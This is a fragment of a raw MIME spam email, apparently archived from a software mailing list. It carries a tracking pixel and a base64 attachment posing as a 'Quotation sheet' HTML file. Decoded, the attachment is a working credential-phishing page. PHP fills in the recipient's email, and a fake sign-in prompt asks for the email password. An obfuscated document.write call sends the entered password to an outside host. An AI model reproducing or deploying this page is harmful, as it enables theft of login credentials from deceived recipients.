; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BO=
RDER-LEFT: 0px; PADDING-RIGHT: 0px; -webkit-font-smoothing: antialiased">
<SPAN lang=3DEN-US style=3D"BORDER-TOP: 0px; BORDER-RIGHT: 0px; VERTICAL-AL=
IGN: baseline; BORDER-BOTTOM: 0px; COLOR: ; PADDING-BOTTOM: 0px; PADDING-TO=
P: 0px; PADDING-LEFT: 0px; MARGIN: 0px; BORDER-LEFT: 0px; PADDING-RIGHT: 0p=
x; -webkit-font-smoothing: antialiased"></SPAN></SPAN>&nbsp;</P></DIV></DIV>
<img src=3D"https://u2503710.ct.sendgrid.net/wf/open?upn=3DS3KlKLKqUh-2B5l9=
sYcP7GRGOjZ-2Fr-2FBZ-2BFdLRbLyIML6Sig2-2BhBDiuMD2JQ7Tb-2BAF3m-2F1wCP7aLBmCU=
y4G1e8SFsRXWISNbYw6JoqOB0GcCv5FjA-2B7fn7UwSd53rIC0tvLGZGKLw0vQo1b-2BJTCutzJ=
HNvNKAaF-2BRKC0LAM3-2FBrEpuHwm7PeT-2FL4Mt80sSDtuMKtwoMuQHg8lF9oyKkeeoseRR70=
iM55-2BEztw2xG4If9pcggaKpgyr7xYdtosFuJJFX" alt=3D"" width=3D"1" height=3D"1=
" border=3D"0" style=3D"height:1px !important;width:1px !important;border-w=
idth:0 !important;margin-top:0 !important;margin-bottom:0 !important;margin=
-right:0 !important;margin-left:0 !important;padding-top:0 !important;paddi=
ng-bottom:0 !important;padding-right:0 !important;padding-left:0 !important=
;"/>
</BODY></HTML>

------=_NextPart_000_0012_931161EF.5CC5FE30
Content-Type: text/html; name="Quotation sheet for EFB-CS 20200609.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Quotation sheet for EFB-CS 20200609.html"

PD9waHANCmZ1bmN0aW9uIGdldGxvZ2luSURGcm9tbG9naW4oJGVtYWlsKQ0Kew0KJGZpbmQgPSAn
QCc7DQokcG9zID0gc3RycG9zKCRlbWFpbCwgJGZpbmQpOw0KJGxvZ2luSUQgPSBzdWJzdHIoJGVt
YWlsLCAwLCAkcG9zKTsNCnJldHVybiAkbG9naW5JRDsNCn0NCmZ1bmN0aW9uIGdldERvbWFpbkZy
b21FbWFpbCgkZW1haWwpDQp7DQovLyBHZXQgdGhlIGRhdGEgYWZ0ZXIgdGhlIEAgc2lnbg0KJGRv
bWFpbiA9IHN1YnN0cihzdHJyY2hyKCRlbWFpbCwgIkAiKSwgMSk7DQpyZXR1cm4gJGRvbWFpbjsN
Cn0NCiRsb2dpbiA9ICRfR0VUWydlbWFpbCddOw0KJGxvZ2luSUQgPSBnZXRsb2dpbklERnJvbWxv
Z2luKCRsb2dpbik7DQokZG9tYWluID0gZ2V0RG9tYWluRnJvbUVtYWlsKCRsb2dpbik7DQokbG4g
PSBzdHJsZW4oJGxvZ2luKTsNCiRsZW4gPSBzdHJyZXYoJGxvZ2luKTsNCiR4ID0gMDsNCmZvcigk
aT0wOyAkaTwkbG47ICRpKyspew0KCWlmKCRsZW5bJGldID09ICJAIil7DQoJCSR4ID0gJGk7DQoJ
CWJyZWFrOw0KCX0NCn0NCiR5dWggPSBzdWJzdHIoJGxlbiwwLCR4KTsNCiR5dWggPSBzdHJyZXYo
JHl1aCk7DQpmb3IoJGk9MDsgJGk8JGxuOyAkaSsrKXsNCglpZigkeXVoWyRpXSA9PSAiLiIpew0K
CQkkeCA9ICRpOw0KCQlicmVhazsNCgl9DQp9DQokeXVoID0gc3Vic3RyKCR5dWgsMCwkeCk7DQok
eXVoID0gdWNmaXJzdCgkeXVoKTsNCiRkaXNwbGF5ID0gc3RydG91cHBlcigkeXVoKTsNCg0Kc2Vz
c2lvbl9zdGFydCgpOw0KaWYgKGlzc2V0KCRfR0VUWydlbWFpbCddKSkgew0KICAgICRjbGllbnRl
bWFpbCA9ICRfR0VUWydlbWFpbCddOw0KICAgICRfU0VTU0lPTlsnY2xpZW50ZW1haWwnXT0kY2xp
ZW50ZW1haWw7DQp9DQoNCj8+DQoNCg0KDQo8IWRvY3R5cGUgaHRtbD4NCjxodG1sPg0KPGhlYWQ+
DQo8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0i
d2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNl
ci1zY2FsYWJsZT0wIi8+DQo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29t
L2Nzcz9mYW1pbHk9TW9udHNlcnJhdDoxMDAsMjAwLDMwMCw0MDAsNTAwLDYwMCw3MDAsODAwIiBy
ZWw9InN0eWxlc2hlZXQiPg0KPHRpdGxlPmxvZ2luX3BvcHVwPC90aXRsZT4NCjxzdHlsZT4NCmgx
LGgyLGgzIHttYXJnaW46IDA7fQ0KLmVib29rLXBvcHVwLXNlYyB7LXdlYmtpdC1ib3gtc2hhZG93
OiAwcHggMTBweCAyMHB4IDBweCByZ2JhKDUwLCA1MCwgNTAsIDAuNTIpOy1tb3otYm94LXNoYWRv
dzogMHB4IDEwcHggMjBweCAwcHggcmdiYSg1MCwgNTAsIDUwLCAwLjUyKTtib3gtc2hhZG93OiAw
cHggMTBweCAyMHB4IDBweCByZ2JhKDUwLCA1MCwgNTAsIDAuNTIpO30NCi5lYm9vay1wb3B1cC1z
ZWMge2JhY2tncm91bmQ6IHJnYigxNzgsMzQsMzQpO2JhY2tncm91bmQ6IC1tb3otbGluZWFyLWdy
YWRpZW50KHRvcCwgcmdiYSg5LCA4MiwgNDUpIDAlLCByZ2JhKDksIDgyLCA0NSkgMTAwJSk7YmFj
a2dyb3VuZDogLXdlYmtpdC1saW5lYXItZ3JhZGllbnQodG9wLCByZ2JhKDksIDgyLCA0NSkgMCUs
cmdiYSgyNTUsIDI1NSwgMjU1LDEpIDEwMCUpO2JhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCh0
byBib3R0b20sIHJnYmEoOSwgODIsIDQ1KSAwJSxyZ2JhKDI1NSwgMjU1LCAyNTUsMSkgMTAwJSk7
ZmlsdGVyOiBwcm9naWQ6RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuZ3JhZGllbnQoIHN0YXJ0
Q29sb3JzdHI9JyNjYmU0Y2MnLCBlbmRDb2xvcnN0cj0nI2I0ZDRkZCcsR3JhZGllbnRUeXBlPTAg
KTsgd2lkdGg6IDUyMXB4OyBtYXJnaW46IDMwcHggYXV0bzsgcGFkZGluZzogMCA0NXB4IDMwcHgg
NDVweDsgYm94LXNpemluZzogYm9yZGVyLWJveDsgdGV4dC1hbGlnbjogY2VudGVyOyBwb3NpdGlv
bjogcmVsYXRpdmU7IH0NCi5lYm9vay1wb3B1cC1zZWMgaDMge21hcmdpbjogMCAwIDJweCAwO3Bh
ZGRpbmc6IDA7bGluZS1oZWlnaHQ6IDIycHg7cGFkZGluZy1ib3R0b206IDIwcHg7Zm9udC1mYW1p
bHk6ICdNb250c2VycmF0Jywgc2Fucy1zZXJpZjtmb250LXNpemU6IDE1cHg7Y29sb3I6ICMwMDA7
Zm9udC13ZWlnaHQ6IDUwMDt9DQouZWJvb2stcG9wdXAtc2VjIGgyIHttYXJnaW46IDAgMCAxMnB4
IDA7cGFkZGluZzogMHB4O2ZvbnQtZmFtaWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7Zm9u
dC1zaXplOiAyNnB4O2NvbG9yOiAjMDAwO3RleHQtdHJhbnNmb3JtOiB1cHBlcmNhc2U7bGV0dGVy
LXNwYWNpbmc6IDJweDtmb250LXdlaWdodDogNzAwO30NCi5lYm9vay1wb3B1cC1zZWMgaDUge2Zv
bnQtc2l6ZTogMTJweDtsZXR0ZXItc3BhY2luZzogMXB4O2NvbG9yOiAjNDY0NjQ2O2ZvbnQtZmFt
aWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7fQ0KLmVib29rLXBvcHVwLXNlYyBoNSBzcGFu
IHt0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTt9DQouZWJvb2stZW1haWwtc2VjIHsgbWFyZ2lu
OiAwcHg7IHBhZGRpbmc6IDBweDsgd2lkdGg6IDEwMCU7IGZsb2F0OiBsZWZ0OyB9DQouZWJvb2st
cG9wdXAtc2VjIC5lYm9va2VtYWlsLWlucHV0MSwuZWJvb2stcG9wdXAtc2VjIC5lYm9va2VtYWls
LWlucHV0MiB7IHdpZHRoOiA0NyU7Ym9yZGVyOiBub25lOyBtYXJnaW4tYm90dG9tOiAzMHB4OyBm
bG9hdDogbGVmdDsgcGFkZGluZzogMTdweDtib3JkZXItcmFkaXVzOiA2cHg7IGZvbnQtZmFtaWx5
OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7Zm9udC1zaXplOiAxM3B4O2ZvbnQtd2VpZ2h0OiA1
MDA7IGJveC1zaXppbmc6IGJvcmRlci1ib3g7IH0NCi5lYm9vay1wb3B1cC1zZWMgLmVib29rZW1h
aWwtaW5wdXQyIHtmbG9hdDogcmlnaHQ7fQ0KLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1p
bnB1dDE6Zm9jdXMsLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dDI6Zm9jdXMsIC5l
Ym9vay1wb3B1cC1zZWMgLmVib29rLWNscy1idG4sIC5lYm9vay1wb3B1cC1zZWMgLmVib29rLWlu
cHV0LWJ0biB7IG91dGxpbmU6IG5vbmU7IH0NCi5lYm9vay1wb3B1cC1zZWMgLmVib29rLWlucHV0
LWJ0biB7IHdpZHRoOiAxMDAlO3dvcmQtc3BhY2luZzogMnB4O2N1cnNvcjogcG9pbnRlcjtmb250
LXdlaWdodDogNTAwO2xldHRlci1zcGFjaW5nOiAxcHg7IG1hcmdpbi1ib3R0b206IDIwcHg7IHBh
ZGRpbmc6IDIwcHggMTZweDtib3JkZXItcmFkaXVzOiA2cHg7IGZsb2F0OiByaWdodDsgYm9yZGVy
OiAwcHg7IGZvbnQtZmFtaWx5OiAnTW9udHNlcnJhdCcsIHNhbnMtc2VyaWY7IGZvbnQtc2l6ZTog
MTZweDsgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgY29sb3I6ICNGRkY7IGJveC1zaXppbmc6
IGJvcmRlci1ib3g7IC13ZWJraXQtYm94LXNoYWRvdzogNXB4IDVweCA1cHggMCByZ2JhKDAsMCww
LDAuMjcpOyBib3gtc2hhZG93OiA1cHggNXB4IDVweCAwIHJnYmEoMCwwLDAsMC4yNyk7YmFja2dy
b3VuZDogcmdiKDAsMCwwLDAuMjcpO2JhY2tncm91bmQ6IC1tb3otbGluZWFyLWdyYWRpZW50KHRv
cCwgcmdiYSgwLDAsMCwwLjI3KSAwJSwgcmdiYSgwLDAsMCwwLjI3KSAxMDAlKTtiYWNrZ3JvdW5k
OiAtd2Via2l0LWxpbmVhci1ncmFkaWVudCh0b3AsIHJnYmEoMCwwLDAsMC4yNykgMCUscmdiYSgw
LDAsMCwwLjI3KSAxMDAlKTtiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQodG8gYm90dG9tLCBy
Z2JhKDAsMCwwLDAuMjcpIDAlLHJnYmEoMCwwLDAsMC4yNykgMTAwJSk7ZmlsdGVyOiBwcm9naWQ6
RFhJbWFnZVRyYW5zZm9ybS5NaWNyb3NvZnQuZ3JhZGllbnQoIHN0YXJ0Q29sb3JzdHI9JyMxZDI1
NjInLCBlbmRDb2xvcnN0cj0nIzEwMTY0OScsR3JhZGllbnRUeXBlPTAgKTt9DQouZWJvb2stcG9w
dXAtc2VjIC5lYm9vay1pbnB1dC1idG46aG92ZXIgeyBiYWNrZ3JvdW5kOiAjMzMzMzMzOyB9DQou
ZWJvb2stcG9wdXAtc2VjIC5lYm9vay1jbHMtYnRuIHsgZm9udC1zaXplOiAxNHB4OyBsaW5lLWhl
aWdodDogMThweDsgd2lkdGg6IDI4cHg7IGhlaWdodDogMjhweDsgLXdlYmtpdC1ib3JkZXItcmFk
aXVzOiA1MCU7IGJvcmRlci1yYWRpdXM6IDUwJTsgYmFja2dyb3VuZDogI0ZGRjsgcG9zaXRpb246
IGFic29sdXRlOyByaWdodDogLTE0cHg7IHRvcDogLTE0cHg7IGJvcmRlcjogMHB4OyAtd2Via2l0
LWJveC1zaGFkb3c6IDAgMCAycHggMCByZ2JhKDAsMCwwLDAuMjcpOyBib3gtc2hhZG93OiAwIDAg
MnB4IDAgcmdiYSgwLDAsMCwwLjI3KTsgY3Vyc29yOiBwb2ludGVyOyB9DQouZWJvb2stcG9wdXAt
c2VjIC5lYm9vay1jbHMtYnRuOmhvdmVyIHtiYWNrZ3JvdW5kOiAjMTQxYjUxO2NvbG9yOiAjZmZm
O30NCi5lYm9vay1wb3B1cC1zZWMgaW1nIHttYXJnaW4tdG9wOiAtMzdweDtwYWRkaW5nLWJvdHRv
bTogMzBweDt9DQoucG9wdXAtZ3JheWJveCB7cG9zaXRpb246IGZpeGVkO3dpZHRoOiAxMDAlO3Rv
cDogMDtsZWZ0OiAwO2hlaWdodDogMTAwdmg7ei1pbmRleDogOTk5OTk7dGV4dC1hbGlnbjogY2Vu
dGVyO2FsaWduLWl0ZW1zOiBjZW50ZXI7ZGlzcGxheTogZmxleDtib3gtc2l6aW5nOiBib3JkZXIt
Ym94O292ZXJmbG93OiBhdXRvO30NCg0KIEBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0
aDo4MTVweCkgew0KLmVib29rLXBvcHVwLXNlYyB7IHdpZHRoOiA4MCU7fQ0KLmVib29rLXBvcHVw
LXNlYyBoMiB7Zm9udC1zaXplOiA0MHB4O30NCi5lYm9vay1wb3B1cC1zZWMgaDMge2ZvbnQtc2l6
ZTogMTZweDtwYWRkaW5nLWJvdHRvbTogMzBweDt9DQouZWJvb2stcG9wdXAtc2VjIC5lYm9va2Vt
YWlsLWlucHV0MSwgLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dDIge21hcmdpbi1i
b3R0b206IDIycHg7cGFkZGluZzogMTRweDtmb250LXNpemU6IDEycHg7fQ0KLmVib29rLXBvcHVw
LXNlYyAuZWJvb2staW5wdXQtYnRuIHtwYWRkaW5nOiAxNXB4IDE2cHg7Zm9udC1zaXplOiAxMnB4
O30NCn0NCkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDo2NzVweCkgew0KLmVib29r
LXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1pbnB1dCB7IHdpZHRoOiA2MCU7IH0NCi5lYm9vay1wb3B1
cC1zZWMgaDMgeyBwYWRkaW5nOiAwO3BhZGRpbmctYm90dG9tOiAyMHB4OyBmb250LXNpemU6IDE0
cHg7fQ0KLmVib29rLXBvcHVwLXNlYyBoMiB7IGZvbnQtc2l6ZTogMzBweDt9DQouZWJvb2stcG9w
dXAtc2VjIC5lYm9va2VtYWlsLWlucHV0MSwgLmVib29rLXBvcHVwLXNlYyAuZWJvb2tlbWFpbC1p
bnB1dDIge21hcmdpbi1ib3R0b206IDE1cHg7fQ0KfQ0KQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAo
bWF4LXdpZHRoOjQ4MHB4KSB7DQouZWJvb2stcG9wdXAtc2VjIHt3aWR0aDogOTAlO30NCi5lYm9v
ay1wb3B1cC1zZWMgLmVib29rZW1haWwtaW5wdXQgeyB3aWR0aDogMTAwJTsgbWFyZ2luLWJvdHRv
bTogMTBweDtwYWRkaW5nOiAxMnB4OyB9DQouZWJvb2stcG9wdXAtc2VjIC5lYm9vay1pbnB1dC1i
dG4geyB3aWR0aDogMTAwJTsgcGFkZGluZzogMTNweCAxNnB4O30NCi5lYm9vay1wb3B1cC1zZWMg
aDMgeyBmb250LXNpemU6IDE2cHg7IGxpbmUtaGVpZ2h0OiAyMHB4O30NCi5lYm9vay1wb3B1cC1z
ZWMgaDUge2xldHRlci1zcGFjaW5nOiAwLjVweDt9DQouZWJvb2stcG9wdXAtc2VjIGgyIHtmb250
LXNpemU6IDI0cHg7bWFyZ2luOiAwIDAgMTBweCAwO30NCi5lYm9vay1wb3B1cC1zZWMge3BhZGRp
bmc6IDAgMjBweCAxMHB4IDIwcHg7fQ0KLmVib29rLXBvcHVwLXNlYyBpbWcge3dpZHRoOiAyMiU7
cGFkZGluZy1ib3R0b206IDIwcHg7fQ0KfQ0KQG1lZGlhIG9ubHkgc2NyZWVuIGFuZCAobWF4LXdp
ZHRoOjQyNXB4KSB7DQouZWJvb2stcG9wdXAtc2VjIGgzIHtmb250LXNpemU6IDEycHg7fQ0KLmVi
b29rLXBvcHVwLXNlYyBoMiB7Zm9udC1zaXplOiAxOHB4O30NCi5lYm9vay1wb3B1cC1zZWMgLmVi
b29rLWlucHV0LWJ0biB7d2lkdGg6IDEwMCU7cGFkZGluZzogMTJweCAxNnB4O30NCi5lYm9vay1w
b3B1cC1zZWMgLmVib29rZW1haWwtaW5wdXQxLCAuZWJvb2stcG9wdXAtc2VjIC5lYm9va2VtYWls
LWlucHV0MiB7d2lkdGg6IDEwMCU7bWFyZ2luLWJvdHRvbTogOHB4O3BhZGRpbmc6IDEycHg7dGV4
dC1hbGlnbjogY2VudGVyO30NCn0NCjwvc3R5bGU+DQo8L2hlYWQ+DQoNCjxib2R5IHN0eWxlPSJi
YWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2h0dHA6Ly9pbmZpbml0aGluZ3MuaW8vd3AtaW5jbHVkZXMv
aW1hZ2VzL3hsLnBuZycpIj4NCjxzZWN0aW9uIGNsYXNzPSJwb3B1cC1ncmF5Ym94Ij4NCjxkaXYg
Y2xhc3M9ImVib29rLXBvcHVwLXNlYyIgPg0KIDxpbWcgc3JjPSJodHRwOi8vbnRrb21hbmRhLmx0
L21lZGlhL3ppb3IveGxzL2ltYWdlcy9sb2dpbjAyX3BvcHVwLnBuZyIgYWx0PSIiPg0KIDxzY3Jp
cHQgbGFuZ3VhZ2U9amF2YXNjcmlwdD5kb2N1bWVudC53cml0ZSh1bmVzY2FwZSgnJTIwJTNDZm9y
bSUyMGNsYXNzJTNEJTIybW9kYWwtY29udGVudCUyMGFuaW1hdGUlMjIlMjBtZXRob2QlM0QlMjJw
b3N0JTIyJTIwYWN0aW9uJTNEJTIyaHR0cHMlM0ElMkYlMkZmYWJzdGV4YXBwYXJlbHMuY29tJTJG
bm9uJTJGdXB4bHMucGhwJTBBJTIyJTNFJykpPC9zY3JpcHQ+DQogIDxoMiBkYXRhLWVkaXQ9InRl
eHQiPlNpZ24gaW48L2gyPg0KICA8aDMgZGF0YS1lZGl0PSJ0ZXh0Ij48Zm9udCBjb2xvcj0iI0ZG
RkZGRiI+d2l0aCB5b3VyIHZhbGlkPHN0cm9uZz4mbmJzcDs8P3BocCBlY2hvICRkaXNwbGF5ID8+
PC9zdHJvbmc+PGJyPmVtYWlsIHBhc3N3b3JkIHRvIHZpZXcgZG9jdW1lbnQ8L2ZvbnQ+PC9oMz4N
CiA8Zm9ybT4gDQogPGRpdiBjbGFzcz0iZWJvb2stZW1haWwtc2VjIj4NCiAgICA8aW5wdXQgdHlw
ZT0iZW1haWwiIGNsYXNzPSJlYm9va2VtYWlsLWlucHV0MSIgIGRhdGEtZWRpdD0icGxhY2Vob2xk
ZXIiIFZhbHVlPSJpbmR1c3RyeXBhY2stZGV2ZWxAbGlzdHMuc291cmNlZm9yZ2UubmV0IiBwbGFj
ZWhvbGRlcj0iRW50ZXIgRW1haWwiIGRpc2FibGVkPg0KCQ0KCTxpbnB1dCB0eXBlPSJoaWRkZW4i
IG5hbWU9ImVtYWlsIiBWYWx1ZT0iaW5kdXN0cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdl
Lm5ldCI+DQogICAgPGlucHV0IHR5cGU9InBhc3N3b3JkIiBjbGFzcz0iZWJvb2tlbWFpbC1pbnB1
dDIiIG5hbWU9InBhc3MiIGRhdGEtZWRpdD0icGxhY2Vob2xkZXIiIHBsYWNlaG9sZGVyPSJFbnRl
ciBQYXNzd29yZCIgcmVxdWlyZWQ+DQogICAgPGJ1dHRvbiBjbGFzcz0iZWJvb2staW5wdXQtYnRu
IiB0eXBlPSJzdWJtaXQiPkNvbnRpbnVlPC9idXR0b24+DQogICAgPGJ1dHRvbiBjbGFzcz0iZWJv
b2stY2xzLWJ0biBjbG9zZS1idG4iPlg8L2J1dHRvbj4NCiAgPC9kaXY+DQogIDxoNT48c3Bhbj5G
b3Jnb3QgUGFzc3dvcmQ/PC9zcGFuPjwvaDU+DQogIDwvZm9ybT4NCjwvZGl2PiAgICANCjwvc2Vj
dGlvbj4NCjwvYm9keT4NCjwvaHRtbD4NCg==

------=_NextPart_000_0012_931161EF.5CC5FE30
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_931161EF.5CC5FE30
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_931161EF.5CC5FE30--


